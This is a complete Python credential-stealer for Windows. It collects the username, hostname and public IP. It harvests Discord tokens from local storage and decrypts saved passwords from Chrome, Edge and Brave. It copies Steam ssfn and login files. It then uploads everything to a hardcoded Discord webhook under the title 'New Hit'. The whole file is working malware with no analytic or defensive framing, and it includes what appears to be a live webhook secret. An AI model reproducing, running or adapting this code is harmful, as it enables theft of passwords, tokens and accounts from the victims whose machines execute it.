import glob
import base64
import os
import re
import json
import sqlite3
import shutil
import requests
import socket
import platform
from pathlib import Path
from datetime import datetime
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

WEBHOOK_URL = "https://discord.com/api/webhooks/1553869114551042130/ccUOjNyk582yhaxEdiGksSPM6ttdHwk3Cb6dKkZuyVTjrTtpj7iJM8k_GPXiGd7VAuzM"

def get_system_info():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text
    except:
        ip = "unknown"
    return {
        "user": os.getlogin(),
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "ip": ip,
        "cpu": platform.processor(),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    }

def get_discord_tokens():
    tokens = []
    paths = [
        os.path.expanduser("~\\AppData\\Roaming\\discord\\Local Storage\\leveldb"),
        os.path.expanduser("~\\AppData\\Roaming\\discordcanary\\Local Storage\\leveldb"),
        os.path.expanduser("~\\AppData\\Roaming\\discordptb\\Local Storage\\leveldb"),
    ]
    pattern = re.compile(r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}")
    for path in paths:
        if not os.path.exists(path):
            continue
        for file in os.listdir(path):
            if not file.endswith((".log", ".ldb")):
                continue
            try:
                with open(os.path.join(path, file), "r", errors="ignore") as f:
                    for match in pattern.findall(f.read()):
                        if match not in tokens:
                            tokens.append(match)
            except:
                pass
    return tokens

def get_browser_paths():
    local = os.path.expanduser("~\\AppData\\Local")
    browsers = {
        "Chrome": f"{local}\\Google\\Chrome\\User Data",
        "Edge": f"{local}\\Microsoft\\Edge\\User Data",
        "Brave": f"{local}\\BraveSoftware\\Brave-Browser\\User Data",
    }
    return {k: v for k, v in browsers.items() if os.path.exists(v)}

def get_master_key(browser_path):
    local_state_path = os.path.join(browser_path, "Local State")
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        import win32crypt
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except:
        return None

def decrypt_password(encrypted_password, master_key):
    try:
        if encrypted_password[:3] == b"v10":
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:]
            aesgcm = AESGCM(master_key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
            return plaintext.decode("utf-8", errors="ignore")
        else:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except:
        return "<encrypted>"

def get_passwords(browser_path):
    results = []
    db = os.path.join(browser_path, "Default", "Login Data")
    if not os.path.exists(db):
        return results
    
    master_key = get_master_key(browser_path)
    
    tmp = os.path.join(os.environ["TEMP"], "ld_tmp.db")
    try:
        shutil.copy2(db, tmp)
        conn = sqlite3.connect(tmp)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for url, user, enc in cursor.fetchall():
            if not user:
                continue
            if master_key:
                password = decrypt_password(enc, master_key)
            else:
                try:
                    import win32crypt
                    password = win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode("utf-8", errors="ignore")
                except:
                    password = "<encrypted>"
            results.append({"url": url, "user": user, "pass": password})
        conn.close()
    except:
        pass
    finally:
        if os.path.exists(tmp):
            os.remove(tmp)
    return results

def get_steam():
    results = {}
    steam_paths = [
        os.path.expanduser("~\\Program Files (x86)\\Steam"),
        os.path.expanduser("~\\Program Files\\Steam"),
        "C:\\Program Files (x86)\\Steam",
        "C:\\Program Files\\Steam",
        os.path.expanduser("~\\AppData\\Local\\Steam"),
    ]
    
    steam_path = None
    for p in steam_paths:
        if os.path.exists(p):
            steam_path = p
            break
    
    if not steam_path:
        return results
    
    ssfn_files = glob.glob(os.path.join(steam_path, "ssfn*"))
    if ssfn_files:
        ssfn_data = []
        for sf in ssfn_files:
            try:
                with open(sf, "rb") as file:
                    data = file.read()
                    ssfn_data.append(base64.b64encode(data).decode())
            except:
                pass
        if ssfn_data:
            results["ssfn"] = ssfn_data
    
    config = os.path.join(steam_path, "config")
    if os.path.exists(config):
        for f in ["config.vdf", "loginusers.vdf"]:
            fp = os.path.join(config, f)
            if os.path.exists(fp):
                try:
                    with open(fp, "r", encoding="utf-8", errors="ignore") as file:
                        content = file.read()
                        results[f] = content[:5000]
                except:
                    pass
    
    userdata = os.path.join(steam_path, "userdata")
    if os.path.exists(userdata):
        try:
            results["userdata"] = os.listdir(userdata)
        except:
            pass
    
    return results

def send_webhook(info, tokens, browsers, steam):
    embed = {
        "title": "New Hit",
        "color": 0xFF0000,
        "fields": [
            {"name": "User", "value": info["user"], "inline": True},
            {"name": "Host", "value": info["hostname"], "inline": True},
            {"name": "IP", "value": info["ip"], "inline": True},
            {"name": "OS", "value": info["os"], "inline": False},
            {"name": "Time", "value": info["time"], "inline": False},
        ],
    }
    if tokens:
        embed["fields"].append({"name": f"Tokens ({len(tokens)})", "value": "\n".join(f"`{t[:60]}...`" for t in tokens[:5]), "inline": False})
    if steam:
        embed["fields"].append({"name": "Steam", "value": f"found: {', '.join(steam.keys())}", "inline": False})
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        data = json.dumps({
            "system": info,
            "tokens": tokens,
            "browsers": browsers,
            "steam": steam,
        }, indent=2, ensure_ascii=False)
        requests.post(WEBHOOK_URL, files={"file": ("data.json", data.encode(), "application/json")}, timeout=15)
    except:
        pass

def main():
    info = get_system_info()
    tokens = get_discord_tokens()
    browsers = {}
    for name, path in get_browser_paths().items():
        browsers[name] = get_passwords(path)
    steam = get_steam()
    send_webhook(info, tokens, browsers, steam)

if __name__ == "__main__":
    main()
